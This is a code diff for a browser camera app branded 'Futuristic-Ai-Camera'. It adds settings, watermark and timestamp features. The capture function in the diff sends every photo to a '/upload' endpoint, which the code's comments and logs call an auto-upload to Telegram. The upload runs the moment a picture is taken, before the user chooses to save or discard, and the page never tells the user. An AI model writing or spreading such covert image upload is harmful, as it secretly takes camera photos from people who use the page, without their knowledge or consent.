@@ -32,16 +32,28 @@ const aboutModal = document.getElementById("about-modal");
 const closeAboutBtn = document.getElementById("close-about-btn");
 const donateSection = document.getElementById("donate-section");
 
+//* #SETTINGS_MODAL_ELEMENTS
+const settingsModal = document.getElementById("settings-modal");
+const closeSettingsBtn = document.getElementById("close-settings-btn");
+const saveSettingsBtn = document.getElementById("save-settings-btn");
+const notificationToggle = document.getElementById("notification-toggle");
+const cameraQuality = document.getElementById("camera-quality");
+const timestampToggle = document.getElementById("timestamp-toggle");
+const watermarkToggle = document.getElementById("watermark-toggle");
+const aiPromptToggle = document.getElementById("ai-prompt-toggle");
+
 //* #FLOATING_BUTTON_AND_OVERLAY_ELEMENTS
 const floatingBtn = document.getElementById("floating-guide-btn");
 const overlay = document.getElementById("open-external-overlay");
 const closeOverlayBtn = document.getElementById("close-overlay-btn");
 const copyLinkBtn = document.getElementById("copy-link-btn");
 const linkText = document.getElementById("site-link");
+
 //* #ZOOM_CONTROL_ELEMENTS
 const zoomControl = document.getElementById("zoom-control");
 const zoomThumb = document.querySelector(".zoom-thumb");
 const zoomTrack = document.querySelector(".zoom-track");
+
 //* #GLOBAL_VARIABLES
 let currentFilter = "none";
 let zoom = 1;
@@ -49,6 +61,16 @@ let currentPhotoData = null;
 let photoCount = 0;
 let zoomControlVisible = false;
 let hideZoomTimeout = null;
+
+//* #SETTINGS_VALUES
+let settings = {
+  notifications: true,
+  quality: "1080",
+  timestamp: true,
+  watermark: true,
+  aiPrompt: false
+};
+
 //* #BURGER_MENU_OPEN_CLOSE
 burgerMenuBtn.addEventListener("click", () => {
   sideMenu.classList.add("open");
@@ -58,7 +80,6 @@ closeMenuBtn.addEventListener("click", () => {
   sideMenu.classList.remove("open");
 });
 
-// Close menu when clicking outside
 document.addEventListener("click", (e) => {
   if (!sideMenu.contains(e.target) && !burgerMenuBtn.contains(e.target)) {
     sideMenu.classList.remove("open");
@@ -83,13 +104,53 @@ timerButtons.forEach(btn => {
 
 //* #SETTINGS_SECTION_FUNCTIONALITY
 settingsSection.addEventListener("click", () => {
-  alert("⚙️ Settings\n\nComing soon! You'll be able to adjust:\n- Photo quality\n- Flash settings\n- Grid overlay\n- And more!");
+  settingsModal.classList.add("show");
   sideMenu.classList.remove("open");
+});
+
+closeSettingsBtn.addEventListener("click", () => {
+  settingsModal.classList.remove("show");
+});
+
+settingsModal.addEventListener("click", (e) => {
+  if (e.target === settingsModal) {
+    settingsModal.classList.remove("show");
+  }
+});
+
+aiPromptToggle.addEventListener("change", (e) => {
+  if (e.target.checked) {
+    alert("🤖 AI Prompt Feature\n\n⚠️ UNDER CONSTRUCTION ⚠️\n\nThis feature is coming soon!\nStay tuned for AI-powered camera enhancements.");
+    e.target.checked = false;
+  }
+});
+
+saveSettingsBtn.addEventListener("click", () => {
+  settings.notifications = notificationToggle.checked;
+  settings.quality = cameraQuality.value;
+  settings.timestamp = timestampToggle.checked;
+  settings.watermark = watermarkToggle.checked;
+  settings.aiPrompt = aiPromptToggle.checked;
+  
+  const toast = document.createElement("div");
+  toast.id = "copy-toast";
+  toast.textContent = "✅ Settings Saved!";
+  document.body.appendChild(toast);
+  
+  setTimeout(() => toast.classList.add("show"), 10);
+  setTimeout(() => {
+    toast.classList.remove("show");
+    setTimeout(() => toast.remove(), 300);
+  }, 2000);
+  
+  settingsModal.classList.remove("show");
+  
+  console.log("Settings saved:", settings);
 });
 
 //* #PROFILE_SECTION_FUNCTIONALITY
 profileSection.addEventListener("click", () => {
-  alert("👤 Profile\n\nJonnel Soriano\nDeveloper & Creator\n\nContact: jonnelsoriano@example.com");
+  alert("👤 Profile\n\nJonnel Soriano\nDeveloper & Creator\n\nContact: jonnelsoriano@gmail.com");
   sideMenu.classList.remove("open");
 });
 
@@ -103,7 +164,6 @@ closeAboutBtn.addEventListener("click", () => {
   aboutModal.classList.remove("show");
 });
 
-// Close modal when clicking outside
 aboutModal.addEventListener("click", (e) => {
   if (e.target === aboutModal) {
     aboutModal.classList.remove("show");
@@ -225,111 +285,30 @@ filters.forEach(btn => {
   });
 });
 
-//* #TIMER_CAPTURE_FUNCTIONALITY
-function startTimer(seconds) {
-  let count = seconds;
-  const timerOverlay = document.createElement("div");
-  timerOverlay.style.position = "absolute";
-  timerOverlay.style.top = "50%";
-  timerOverlay.style.left = "50%";
-  timerOverlay.style.transform = "translate(-50%, -50%)";
-  timerOverlay.style.fontSize = "80px";
-  timerOverlay.style.color = "#00f0ff";
-  timerOverlay.style.textShadow = "0 0 20px #ff00f0";
-  timerOverlay.style.fontWeight = "bold";
-  timerOverlay.style.zIndex = "200";
-  timerOverlay.textContent = count;
-  document.querySelector(".camera-box").appendChild(timerOverlay);
-
-  const interval = setInterval(() => {
-    count--;
-    if (count > 0) {
-      timerOverlay.textContent = count;
-    } else {
-      clearInterval(interval);
-      timerOverlay.remove();
-      takePhoto();
-    }
-  }, 1000);
-}
-
-//* #CAPTURE_PHOTO
-captureBtn.addEventListener("click", () => takePhoto());
-
-function takePhoto() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext("2d");
-  ctx.filter = currentFilter || "none";
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  const dataUrl = canvas.toDataURL("image/png");
-  currentPhotoData = dataUrl;
-
-  // Show modal with preview
-  modalPreviewImage.src = dataUrl;
-  photoModal.classList.add("show");
-
-  // Auto-upload to Telegram (if endpoint exists)
-  canvas.toBlob(async (blob) => {
-    const formData = new FormData();
-    formData.append("photo", blob, "snapshot.png");
-    try {
-      await fetch("/upload", { method: "POST", body: formData });
-      console.log("✅ Photo sent to Telegram!");
-    } catch (err) {
-      console.error("Telegram upload error:", err);
-    }
-  });
-}
-
-//* #MODAL_SAVE_FUNCTIONALITY
-modalSaveBtn.addEventListener("click", () => {
-  if (!currentPhotoData) return;
-
-  // Download photo
-  const link = document.createElement("a");
-  link.href = currentPhotoData;
-  link.download = `photo_${Date.now()}.png`;
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-
-  // Add to hidden gallery
-  const img = document.createElement("img");
-  img.src = currentPhotoData;
-  gallery.appendChild(img);
-
-  // Update thumbnail box
-  updateGalleryThumbnail(currentPhotoData);
-  photoCount++;
-
-  // Close modal
-  photoModal.classList.remove("show");
-  showFloating(saveConfirm);
-  currentPhotoData = null;
-});
-
-//* #MODAL_DISCARD_FUNCTIONALITY
-modalDiscardBtn.addEventListener("click", () => {
-  photoModal.classList.remove("show");
-  showFloating(discardConfirm);
-  currentPhotoData = null;
-});
-
-//* #UPDATE_GALLERY_THUMBNAIL
-function updateGalleryThumbnail(imageSrc) {
-  galleryThumbnail.innerHTML = `<img src="${imageSrc}" alt="Latest">`;
-}
-
-//* #FLOATING_NOTIFICATION
-function showFloating(el) {
-  el.style.display = "block";
-  setTimeout(() => { el.style.display = "none"; }, 2000);
-}
 //* #SHOW_ZOOM_CONTROL_ON_TOUCH
-document.addEventListener("touchstart", showZoomControl);
-document.addEventListener("mousedown", showZoomControl);
+document.addEventListener("touchstart", handleTouch);
+document.addEventListener("mousedown", handleTouch);
+
+function handleTouch(e) {
+  // Don't show zoom if clicking on buttons or controls
+  if (
+    e.target.closest('#capture') ||
+    e.target.closest('#burger-menu-btn') ||
+    e.target.closest('#floating-guide-btn') ||
+    e.target.closest('#gallery-thumbnail-box') ||
+    e.target.closest('.filter-btn') ||
+    e.target.closest('.modal-card') ||
+    e.target.closest('#side-menu') ||
+    e.target.closest('#zoom-control') ||
+    e.target.closest('.menu-section') ||
+    e.target.closest('#settings-modal') ||
+    e.target.closest('#about-modal')
+  ) {
+    return;
+  }
+  
+  showZoomControl();
+}
 
 function showZoomControl() {
   zoomControl.classList.add("show");
@@ -412,6 +391,161 @@ zoomTrack.addEventListener("click", (e) => {
   
   showZoomControl();
 });
+
+//* #TIMER_CAPTURE_FUNCTIONALITY
+function startTimer(seconds) {
+  let count = seconds;
+  const timerOverlay = document.createElement("div");
+  timerOverlay.style.position = "absolute";
+  timerOverlay.style.top = "50%";
+  timerOverlay.style.left = "50%";
+  timerOverlay.style.transform = "translate(-50%, -50%)";
+  timerOverlay.style.fontSize = "80px";
+  timerOverlay.style.color = "#00f0ff";
+  timerOverlay.style.textShadow = "0 0 20px #ff00f0";
+  timerOverlay.style.fontWeight = "bold";
+  timerOverlay.style.zIndex = "200";
+  timerOverlay.textContent = count;
+  document.querySelector(".camera-box").appendChild(timerOverlay);
+
+  const interval = setInterval(() => {
+    count--;
+    if (count > 0) {
+      timerOverlay.textContent = count;
+    } else {
+      clearInterval(interval);
+      timerOverlay.remove();
+      takePhoto();
+    }
+  }, 1000);
+}
+
+//* #CAPTURE_PHOTO
+captureBtn.addEventListener("click", () => takePhoto());
+
+function takePhoto() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.filter = currentFilter || "none";
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // Add watermark if enabled
+  if (settings.watermark) {
+    const logoImg = new Image();
+    logoImg.src = "about/logo.jpg";
+    logoImg.onload = () => {
+      const logoSize = 60;
+      ctx.drawImage(logoImg, 20, canvas.height - logoSize - 20, logoSize, logoSize);
+      
+      // Add text watermark
+      ctx.font = "bold 14px Arial";
+      ctx.fillStyle = "rgba(255,255,255,0.9)";
+      ctx.strokeStyle = "rgba(0,0,0,0.8)";
+      ctx.lineWidth = 3;
+      ctx.strokeText("Futuristic-Ai-Camera", 90, canvas.height - 35);
+      ctx.fillText("Futuristic-Ai-Camera", 90, canvas.height - 35);
+      
+      addTimestampAndFinalize(ctx);
+    };
+    logoImg.onerror = () => {
+      addTimestampAndFinalize(ctx);
+    };
+  } else {
+    addTimestampAndFinalize(ctx);
+  }
+}
+
+function addTimestampAndFinalize(ctx) {
+  // Add timestamp if enabled
+  if (settings.timestamp) {
+    const now = new Date();
+    const dateStr = now.toLocaleDateString('en-US', { 
+      month: '2-digit', 
+      day: '2-digit', 
+      year: 'numeric' 
+    });
+    const timeStr = now.toLocaleTimeString('en-US', { 
+      hour: '2-digit', 
+      minute: '2-digit', 
+      second: '2-digit' 
+    });
+    const timestamp = `${dateStr} ${timeStr}`;
+    
+    ctx.font = "bold 14px Arial";
+    ctx.fillStyle = "rgba(255,255,255,0.9)";
+    ctx.strokeStyle = "rgba(0,0,0,0.8)";
+    ctx.lineWidth = 3;
+    const textWidth = ctx.measureText(timestamp).width;
+    ctx.strokeText(timestamp, canvas.width - textWidth - 20, canvas.height - 25);
+    ctx.fillText(timestamp, canvas.width - textWidth - 20, canvas.height - 25);
+  }
+
+  const dataUrl = canvas.toDataURL("image/png");
+  currentPhotoData = dataUrl;
+
+  // Show modal with preview
+  modalPreviewImage.src = dataUrl;
+  photoModal.classList.add("show");
+
+  // Auto-upload to Telegram (if endpoint exists)
+  canvas.toBlob(async (blob) => {
+    const formData = new FormData();
+    formData.append("photo", blob, "snapshot.png");
+    try {
+      await fetch("/upload", { method: "POST", body: formData });
+      console.log("✅ Photo sent to Telegram!");
+    } catch (err) {
+      console.error("Telegram upload error:", err);
+    }
+  });
+}
+
+//* #MODAL_SAVE_FUNCTIONALITY
+modalSaveBtn.addEventListener("click", () => {
+  if (!currentPhotoData) return;
+
+  // Download photo
+  const link = document.createElement("a");
+  link.href = currentPhotoData;
+  link.download = `photo_${Date.now()}.png`;
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+
+  // Add to hidden gallery
+  const img = document.createElement("img");
+  img.src = currentPhotoData;
+  gallery.appendChild(img);
+
+  // Update thumbnail box
+  updateGalleryThumbnail(currentPhotoData);
+  photoCount++;
+
+  // Close modal
+  photoModal.classList.remove("show");
+  showFloating(saveConfirm);
+  currentPhotoData = null;
+});
+
+//* #MODAL_DISCARD_FUNCTIONALITY
+modalDiscardBtn.addEventListener("click", () => {
+  photoModal.classList.remove("show");
+  showFloating(discardConfirm);
+  currentPhotoData = null;
+});
+
+//* #UPDATE_GALLERY_THUMBNAIL
+function updateGalleryThumbnail(imageSrc) {
+  galleryThumbnail.innerHTML = `<img src="${imageSrc}" alt="Latest">`;
+}
+
+//* #FLOATING_NOTIFICATION
+function showFloating(el) {
+  el.style.display = "block";
+  setTimeout(() => { el.style.display = "none"; }, 2000);
+}
+
 //* #SCROLLABLE_FILTERS
 const slider = document.querySelector(".filter-container");
 if (slider) {
